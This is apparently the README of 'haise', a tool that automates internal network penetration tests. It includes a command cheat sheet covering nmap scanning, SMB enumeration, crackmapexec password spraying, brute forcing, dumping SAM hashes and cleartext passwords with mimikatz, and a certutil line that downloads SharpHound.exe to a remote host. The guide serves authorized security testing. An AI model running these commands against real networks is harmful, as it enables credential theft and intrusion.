# haise
## Internal Network Pentest Framework
![](https://github.com/syedumerqadri/haise/blob/master/image.jpg)


## Internal Penetration Testing:

An Internal Penetration Test differs from a vulnerability assessment in that it actually exploits the vulnerabilities to determine what information is actually exposed. An Internal Penetration Test mimics the actions of an actual attacker exploiting weaknesses in network security without the usual dangers. This test examines internal IT systems for any weakness that could be used to disrupt the confidentiality, availability or integrity of the network

## Methodology:

        •  Internal Network Scanning
                  traceroute www.google.com
                  nmap 192.168.1.*
                  Reverse IP Lookup (https://mxtoolbox.com/ReverseLookup.aspx)
                  Ip Info: https://ipinfo.io/
        
        •  Port Scanning
                  nmap -p- -T4 -iL sub.txt (Fast Scan)
                  nmap -A 192.168.1.1 (Little Intense and slow)
                  nmap -sV -sC -Pn -p 1-65535 -T5 --min-rate 1000 --max-retries 5 192.168.1.1
                  nmap -sS -sC -sV -v -p 445 -iL subnet-files.txt
                  nmap -sS -sC -sV -v -p 21 -iL subnet-files.txt

                  Web Ports: 80, 8080, 443

                  
        •  Fingerprinting
                  nmap -sV --version-intensity 5 192.168.1.1
                  nc 192.168.1.1 80
                  curl -sI http://192.168.1.1

        •  Vulnerbility Scanning
                  nmap --script vuln 192.168.1.1 -d
                  nikto
                  dirsearch
                  nessus    (https://localhost:8834)
        
        •  IDS Penetration Testing
                  lbd 45.34.23.12
                  wafw00f http://192.168.1.1  
    
        •  SMB Enumeration
                Discover Host:
                cme smb <subnet>    (cme => crackmapexecs)

                Null Session:
                cme smb 192.168.24.0/24 -u '' -p ''
                smbmap –host-file smb-hosts.txt

                SMB Map:
                smbmap -H 192.168.1.1
                smbmap.py –host-file smb-hosts.txt u ‘jsmith’ -p ‘Spring!2020’ -q -R –depth 2 –exclude ADMIN$ IPC$ -A ‘passw’

        •  Exploit Research
                  https://www.exploit-db.com/
                  https://www.rapid7.com/db/
                  https://cxsecurity.com/search/       

        •  Manual Vulnerability Testing and Verification
        •  Password Strength Testing
                  rate limiting
                  sparta(tool)
                  burp (brute force)

        •  Infrastructure Mapping
                  Maltego

                  DNS Server
                  Firewall
                  Cloud
                  Employ Device
                  Logging Server
                  Directory Service
                  Admin Workstation
                                                               
        •  Administrator Privileges Escalation
        •  Database Security Controls Testing    
        •  Third-Party/Vendor Security Configuration Testing

## AD Pentesting:
“Active Directory” Called as “AD” is a directory service that Microsoft developed for the Windows domain network. 
Using it you can to control domain computers and services that are running on every node of your domain.

Active Directory (Pen Test ) is most commonly used in the Enterprise Infrastructure to manage 1000’s of computers in the organization with a single point of control as “Domain Controller”
Performing Penetration Testing of Active Directory is more interesting and are mainly targeted by many APT Groups with a lot of different techniques

    Check SMB Service in use:
    cat hosts.txt | xargs -I{} sh -c 'crackmapexec smb {}'
    
    Enumerate shares:
    crackmapexec 192.168.0.12 -u username -p 'password'  --shares

    Whos logged into the machine:
    crackmapexec 192.168.0.12 -u username -p 'password' --users

    Dump local sam hashes
    python crackmapexec 192.168.0.12 -u username -p 'password' --sam

    Dump clear text password:
    crackmapexec 192.168.0.12 -u username -p 'password' -m modules/credentials/mimikatz.py

    Downloading:
    cme smb 10.128.111.203 -u 'xampp' -p '@sdF1234' -d HQCMSDBQ -x "certutil.exe -urlcache -split -f http://172.17.17.214/SharpHound.exe pentest/zz.exe"

    Check account lockout policy:
    crackmapexec smb 192.168.1.101 -u syedali -p 'test'  --pass-pol

    Password spray:
    python crackmapexec.py 192.168.0.0/24 -u username -p 'password'
                
    Bruteforce:
    crackmapexec smb 192.168.1.102 -u username.txt -p gooo

    Connecting:
    smbclient -L 192.168.1.112 -U "Creative Green"

## Tool for Automation:
Internal network could possibly contain large amount of IPs,For automation first i generate some
of the one liner commands and then automate them with python.

## Usage:
1. git clone https://github.com/syedumerqadri/haise
2. cd haise
3. put all provided IPs on hosts.txt
4. python haise.py

You will got the prompt shell

## Shell:
		[exit]
		[clear]
		[hosts]	list all hosts
		[alive]	check if hosts are alive
		[ports]	port scan of all hosts
		[dir]	Directory Enumuration
	        [headers]  Grab Web Headers
		[scan]	Grab Headers, Port Scan and Directory Enumuration for all hosts 
		[ids] Detect Intrusion Detection System
		[smb] Check for SMB Services







